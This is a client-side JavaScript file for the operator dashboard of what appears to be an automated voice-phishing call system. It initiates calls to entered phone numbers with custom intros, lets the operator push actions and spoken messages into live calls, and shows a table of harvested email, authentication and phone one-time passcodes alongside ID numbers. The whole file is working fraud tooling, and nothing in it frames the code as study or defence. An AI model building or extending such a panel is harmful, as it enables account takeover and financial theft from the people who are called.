const socket = io();
let currentSessionId = null;

function addLog(message, type = 'info') {
    const container = document.getElementById('logsContainer');
    const logEntry = document.createElement('div');
    logEntry.className = `log-entry ${type}`;
    
    let icon = '';
    switch(type) {
        case 'success': icon = '✓'; break;
        case 'warning': icon = '⚠'; break;
        case 'error': icon = '✗'; break;
        default: icon = 'ℹ';
    }
    
    logEntry.innerHTML = `
        <span>${icon}</span>
        <span>${new Date().toLocaleTimeString()}</span>
        <span>${message}</span>
    `;
    
    container.appendChild(logEntry);
    container.scrollTop = container.scrollHeight;
    
    while (container.children.length > 100) {
        container.removeChild(container.firstChild);
    }
}

function playNotificationSound() {
    const audio = new Audio('data:audio/wav;base64,U3RlYWx0aCBzb3VuZCBub3QgYXZhaWxhYmxl');
    audio.play().catch(() => {});
}

async function loadContacts() {
    try {
        const response = await fetch('/api/admin/contacts');
        const contacts = await response.json();
        
        const tbody = document.querySelector('#contactsTable tbody');
        if (contacts.length === 0) {
            tbody.innerHTML = '<tr><td colspan="7" class="loading">No contacts found</td></tr>';
            return;
        }
        
        tbody.innerHTML = contacts.map(contact => `
            <tr>
                <td>${contact.full_name || '-'}</td>
                <td>${contact.phone_number}</td>
                <td>${contact.email_otp || '-'}</td>
                <td>${contact.auth_otp || '-'}</td>
                <td>${contact.phone_otp || '-'}</td>
                <td>${contact.id_number || '-'}</td>
                <td><span class="status-badge status-${contact.status}">${contact.status}</span></td>
            </tr>
        `).join('');
    } catch (error) {
        console.error('Error loading contacts:', error);
    }
}

document.getElementById('callForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const phoneNumber = document.getElementById('phoneNumber').value;
    const fullName = document.getElementById('fullName').value;
    const subject = document.getElementById('subject').value;
    const customIntro = document.getElementById('customIntro').value;
    
    const submitBtn = e.target.querySelector('button[type="submit"]');
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Initiating...';
    
    try {
        const response = await fetch('/api/calls/initiate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone_number: phoneNumber, full_name: fullName, subject, custom_intro: customIntro })
        });
        
        const data = await response.json();
        
        if (data.success) {
            addLog(`Call initiated to ${phoneNumber}`, 'success');
            document.getElementById('callForm').reset();
            loadContacts();
        } else {
            addLog(`Failed: ${data.error}`, 'error');
        }
    } catch (error) {
        addLog(`Error: ${error.message}`, 'error');
    } finally {
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<i class="fas fa-phone-alt"></i> Initiate Call';
    }
});

document.querySelectorAll('.action-btn').forEach(btn => {
    btn.addEventListener('click', async () => {
        if (!currentSessionId) {
            addLog('No active call selected', 'warning');
            return;
        }
        
        const action = btn.dataset.action;
        
        try {
            const response = await fetch(`/api/admin/request-action/${currentSessionId}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action })
            });
            
            const data = await response.json();
            if (data.success) {
                addLog(`Requested ${action.replace('_', ' ').toUpperCase()} from user`, 'info');
            }
        } catch (error) {
            addLog(`Error requesting action: ${error.message}`, 'error');
        }
    });
});

document.getElementById('sendCustomVoice').addEventListener('click', async () => {
    if (!currentSessionId) {
        addLog('No active call selected', 'warning');
        return;
    }
    
    const message = document.getElementById('customVoiceMessage').value;
    if (!message) {
        addLog('Please enter a custom message', 'warning');
        return;
    }
    
    try {
        const response = await fetch(`/api/admin/custom-voice/${currentSessionId}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message })
        });
        
        const data = await response.json();
        if (data.success) {
            addLog(`Custom voice sent: "${message}"`, 'success');
            document.getElementById('customVoiceMessage').value = '';
        }
    } catch (error) {
        addLog(`Error sending custom voice: ${error.message}`, 'error');
    }
});

document.getElementById('clearLogs').addEventListener('click', () => {
    const container = document.getElementById('logsContainer');
    container.innerHTML = '<div class="log-entry info">Logs cleared</div>';
});

socket.on('call_initiated', (data) => {
    addLog(`Call initiated: ${data.phone_number}`, 'info');
    loadContacts();
    playNotificationSound();
});

socket.on('user_response', (data) => {
    addLog(`User pressed ${data.value}`, 'success');
    playNotificationSound();
});

socket.on('data_collected', (data) => {
    addLog(`Data received: ${data.type} = ${data.value}`, 'success');
    loadContacts();
    playNotificationSound();
});

socket.on('admin_action', (data) => {
    addLog(`Admin action: ${data.message || data.action}`, 'warning');
});

socket.on('call_status', (data) => {
    addLog(`Call ${data.session_id}: ${data.status} (${data.duration || 0}s)`, 'info');
    if (data.status === 'completed') {
        currentSessionId = null;
        document.getElementById('activeCallInfo').innerHTML = '<div class="no-active">No active call selected</div>';
        document.getElementById('actionButtons').style.display = 'none';
        document.getElementById('customVoiceSection').style.display = 'none';
    }
});

async function loadActiveCalls() {
    try {
        const response = await fetch('/api/admin/active-calls');
        const calls = await response.json();
        
        if (calls.length > 0 && !currentSessionId) {
            currentSessionId = calls[0].session_id;
            updateActiveCallDisplay(calls[0]);
        } else if (calls.length > 0 && currentSessionId) {
            const currentCall = calls.find(c => c.session_id === currentSessionId);
            if (currentCall) {
                updateActiveCallDisplay(currentCall);
            }
        }
    } catch (error) {
        console.error('Error loading active calls:', error);
    }
}

function updateActiveCallDisplay(call) {
    const container = document.getElementById('activeCallInfo');
    container.innerHTML = `
        <div class="call-info-details">
            <div>
                <div class="name">${call.full_name || 'Unknown'}</div>
                <div class="phone">${call.phone_number}</div>
            </div>
            <div class="call-status">
                <i class="fas fa-circle"></i>
                <span>${call.current_action || 'active'}</span>
            </div>
        </div>
    `;
    document.getElementById('actionButtons').style.display = 'grid';
    document.getElementById('customVoiceSection').style.display = 'block';
}

setInterval(loadActiveCalls, 5000);
loadContacts();
loadActiveCalls();
addLog('System ready. Dashboard connected.', 'success');